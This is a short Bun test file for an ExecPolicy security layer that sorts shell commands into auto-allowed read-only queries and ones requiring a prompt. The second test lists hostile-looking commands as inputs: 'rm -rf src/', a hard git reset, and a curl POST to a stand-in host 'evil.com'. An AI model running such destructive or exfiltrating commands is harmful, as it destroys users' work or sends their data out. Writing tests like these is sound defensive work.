import { describe, expect, test } from "bun:test";
import { ExecPolicy } from "../src/security/exec-policy";

describe("ExecPolicy Security Rules", () => {
  test("allows safe read-only queries automatically", () => {
    const policy = new ExecPolicy();

    expect(policy.evaluate("git status").decision).toBe("allow");
    expect(policy.evaluate("git log -n 5").decision).toBe("allow");
    expect(policy.evaluate("ls -la").decision).toBe("allow");
    expect(policy.evaluate("cat package.json").decision).toBe("allow");
    expect(policy.evaluate("bun test").decision).toBe("allow");
  });

  test("prompts for dangerous or destructive commands", () => {
    const policy = new ExecPolicy();

    expect(policy.evaluate("rm -rf src/").decision).toBe("prompt");
    expect(policy.evaluate("git reset --hard HEAD~1").decision).toBe("prompt");
    expect(policy.evaluate("curl -X POST https://evil.com").decision).toBe("prompt");
  });
});
